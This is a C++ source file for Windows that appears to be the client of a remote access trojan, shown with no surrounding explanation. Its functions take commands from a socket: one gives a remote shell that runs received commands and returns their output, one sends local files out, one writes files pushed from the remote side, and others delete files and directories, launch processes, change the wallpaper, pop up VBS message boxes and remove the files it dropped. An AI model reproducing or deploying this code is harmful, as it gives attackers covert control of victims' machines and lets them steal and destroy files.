void sendall(string data)
{
    send(objSocket, to_string(data.length()).data(), sprintf(buffer, "%d", data.length()), 0);
    Sleep(200); // delay for sending data over accordingly
    send(objSocket, data.data(), data.length(), 0);
}

string recvall(int bufsize)
{
    string data;

    while (data.length() < bufsize) {
        try {
            data.append(buffer, recv(objSocket, buffer, sizeof(buffer), 0));
            return data;
        
        } catch (exception e) { break; }

    } return "error";
}

int getBufferSize()
{
    recv(objSocket, buffer, sizeof(buffer), 0);
    return atoi(buffer);
}

void clearLogs() {
    for (int i = 0; i < fileLog.size(); i++) {
        remove(fileLog[i].data());
    
    } fileLog.clear();
}
// ------------------------------------------------------------------------------------------------------------------
void vbsMessageBox(string message)
{
    string location = appdata + "/msg.vbs";
    ofstream VBS_FILE(location);

    VBS_FILE << "MsgBox (\"" + message + "\"), 64, \"[Message]\"";
    VBS_FILE.close();

    if (ShellExecuteA(NULL, "open", location.data(), NULL, NULL, 0)) {
        sendall("[+] Message Sent");
    
    } else sendall("[!] Unable to Display Message");

    fileLog.push_back(location);
}

void ChangeWallpaper(string fileName)
{
    recv(objSocket, buffer, sizeof(buffer), 0);

    string data;
    int fileSize = atoi(buffer);

    while (data.length() < fileSize) {
        try {
            data.append(buffer, recv(objSocket, buffer, sizeof(buffer), 0));
        
        } catch (exception e) { return; }
    
    } string location = appdata + "/" + fileName;

    FILE* RemoteFile = fopen(location.data(), "wb");
    fwrite(data.data(), 1, data.size(), RemoteFile);
    fclose(RemoteFile);

    SystemParametersInfo
    (
        SPI_SETDESKWALLPAPER,
        0,
        (PVOID)location.data(),
        SPIF_UPDATEINIFILE
    
    ); fileLog.push_back(location);
}

void StartProcess(string filePath)
{
    ifstream localFile(filePath);
    if (!localFile.is_open()) {
        sendall("invalid");
        return;
    
    } localFile.close(); sendall("valid");

    if (ShellExecuteA(NULL, "open", filePath.data(), NULL, NULL, 0)) {
        sendall("[+] Process Running");
    
    } else sendall("[!] Unable to Start Process");
}

void RemoteCMD()
{
    sendall(getcwd(buffer, sizeof(buffer)));

    string data;
    FILE* stream;

    while (true)
    {
        string command = recvall(getBufferSize());
        if (command == "exit" || command == "error") return;

        command.append(" 2>&1");
        stream = popen(command.c_str(), "r");

        if (stream) {
            while (!feof(stream))
            if (fgets(buffer, sizeof(buffer), stream) != NULL) {
                data.append(buffer);
            
            } pclose(stream);
        
        } sendall(data); data.clear();
    
    } fclose(stream);
}

void ViewFiles(string directory)
{
    struct dirent* entry;
    int fileCount = 0;
    string files;

    DIR* dir = opendir(directory.data());
    if (!dir) {
        sendall("invalid");
        return;
    
    } sendall("valid");

    try {
        while ((entry = readdir(dir)) != NULL) {
            if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) {
                continue;
                
            } files += entry->d_name; files += "|";  fileCount++;
        
        } closedir(dir); sendall(files);
    
    } catch (exception e) {
        return;
    }
}

void SendFile(string filePath)
{
    string data;
    vector<char> contents;
    ifstream localFile(filePath);

    if (!localFile.is_open()) {
        sendall("invalid");
        return;
    
    } sendall("valid");

    streampos start = localFile.tellg();
    localFile.seekg(0, ios::end);

    streampos end = localFile.tellg();
    localFile.seekg(0, ios::beg);

    contents.resize(static_cast<size_t>(end - start));
    localFile.read(&contents[0], contents.size());

    for (const char& c : contents) {
        data += c;
    
    }; localFile.close(); sendall(data);
}

void ReceiveFile(string fileName)
{
    string data;
    int fileSize = getBufferSize();

    while (data.length() < fileSize) {
        try {
            data.append(buffer, recv(objSocket, buffer, sizeof(buffer), 0));
        
        } catch (exception e) {
            return;
        }

    } string location = appdata + "/" + fileName;

    FILE* RemoteFile = fopen(location.data(), "wb");
    fwrite(data.data(), 1, data.size(), RemoteFile);
    fclose(RemoteFile);

    fileLog.push_back(location);
}

void DelFile(string filePath)
{
    ifstream localFile(filePath);
    if (!localFile.is_open()) {
        sendall("invalid");
        return;
    
    } localFile.close(); sendall("valid");

    if (remove(filePath.data()) != 0) {
        sendall("[!] Unable to Delete File");
    
    } else sendall("[+] File Deleted");
}

void DelDirectory(string directory)
{
    if (GetFileAttributesA(directory.data()) == INVALID_FILE_ATTRIBUTES) {
        sendall("invalid");
        return;
    
    } sendall("valid");

    struct dirent* entry;
	DIR* dir = opendir(directory.data());

	while ((entry = readdir(dir)) != NULL) {
		string files = directory + "/" + entry->d_name;
		remove(files.data());
    
    } closedir(dir); rmdir(directory.data());

    if (GetFileAttributesA(directory.data()) != INVALID_FILE_ATTRIBUTES) {
        sendall("[!] Unable to Delete Directory");
        return;
    
    } sendall("[+] Directory Deleted");
}
